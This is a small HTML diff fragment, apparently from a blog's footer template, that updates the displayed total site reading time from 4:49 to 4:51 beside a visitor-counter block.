       <i class="fa fa-coffee"></i>
     </span>
       <span>站点阅读时长 &asymp;</span>
-    <span title="站点阅读时长">4:49</span>
+    <span title="站点阅读时长">4:51</span>
   </span>
 </div>
 <div class="busuanzi-count">
